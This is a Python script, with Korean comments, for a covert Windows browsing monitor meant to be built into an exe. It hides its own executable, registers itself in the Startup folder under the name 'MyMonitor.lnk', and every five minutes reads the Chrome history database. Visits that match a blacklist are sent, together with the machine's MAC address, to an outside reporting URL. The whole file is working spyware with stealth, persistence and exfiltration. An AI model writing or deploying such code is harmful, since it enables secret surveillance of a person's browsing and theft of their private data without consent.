import sqlite3
import shutil
import tempfile
import os
import requests
import re
import subprocess
import time
from uuid import getnode
import sys

#이거 다운받고 터미널에 pyinstaller 이 파일 이름.py 하면 app.exe가 생김 그걸 깔면 자동 숨김처리가 됨.
#문제점: 숨김 처리만 하고 깔자마자 실행되는 코드가 없음.
#아 그리고 이 코드 수정한다고 .exe파일은 같이 수정 안된다.

#실행시 파일 자동 숨김처리
def hide_self():
    try:
        # 현재 실행 중인 exe 파일 경로
        filepath = sys.executable
        subprocess.call(['attrib', '+h', filepath])
    except:
        pass

hide_self()

# 시작 프로그램에 자동 등록 함수
def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut_path = os.path.join(startup_path, "MyMonitor.lnk")
    exe_path = sys.executable  # 현재 실행 중인 파일 (.exe일 경우 해당 경로)

    if not os.path.exists(shortcut_path):
        try:
            import win32com.client
            shell = win32com.client.Dispatch("WScript.Shell")
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = exe_path
            shortcut.WorkingDirectory = os.path.dirname(exe_path)
            shortcut.IconLocation = exe_path
            shortcut.save()
            print("[자동 실행 등록 완료]")
        except Exception as e:
            print(f"[자동 실행 등록 실패] {e}")

# 최초 실행 시 자동 등록 시도
add_to_startup()

while True:
    try:
        # 0. 마지막 실행 시간 로드
        last_run_file = "last_run.txt"
        if os.path.exists(last_run_file):
            with open(last_run_file, "r") as f:
                last_run_time = f.read().strip()
        else:
            last_run_time = None  # 처음 실행일 경우

        # 1. 크롬 히스토리 경로
        history_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

        # 2. 방문기록 복사해서 db에 연결
        temp_dir = tempfile.gettempdir()
        temp_history_path = os.path.join(temp_dir, "History_copy.db")
        shutil.copy2(history_path, temp_history_path)

        conn = sqlite3.connect(temp_history_path)
        cursor = conn.cursor()

        # 3. 방문 기록 쿼리
        query = """
        SELECT
            urls.url,
            urls.title,
            datetime((visits.visit_time / 1000000) - 11644473600, 'unixepoch', 'localtime') AS visit_time
        FROM visits
        JOIN urls ON visits.url = urls.id
        ORDER BY visit_time ASC;
        """

        cursor.execute(query)
        history_data = cursor.fetchall()

        # 4. 블랙리스트 로딩
        file_name = "bl.txt"
        with open(file_name, "r", encoding="utf-8") as file:
            blacklist = [line.strip() for line in file if line.strip()]

        # 5. 새로운 방문기록만 필터링
        new_last_run_time = None
        for url, title, visit_time in history_data:
            if last_run_time and visit_time <= last_run_time:
                continue  # 이전 기록은 건너뜀

            # 다음 실행을 위한 최신 시간 갱신
            new_last_run_time = visit_time

            for blocked_url in blacklist:
                if blocked_url in url:
                    data = {
                        "title": title,
                        "url": url,
                        "visit_time": visit_time,
                        "uuid": ("MAC : ", ':'.join(re.findall('..', '%012x' % getnode()))),
                    }
                    try:
                        response = requests.post("https://example.com/report", json=data)
                        print(f"[보고됨] {url} | 응답 코드: {response.status_code}")
                    except requests.exceptions.RequestException as e:
                        print(f"[요청 실패] {url} | 이유: {e}")

        conn.close()

        # 6. 최신 실행 시간 저장
        if new_last_run_time:
            with open(last_run_file, "w") as f:
                f.write(new_last_run_time)

    except Exception as e:
        print(f"[오류 발생] {e}")

    print("[대기 중] 5분 후 다시 실행됩니다...")
    time.sleep(300)  # 5분 대기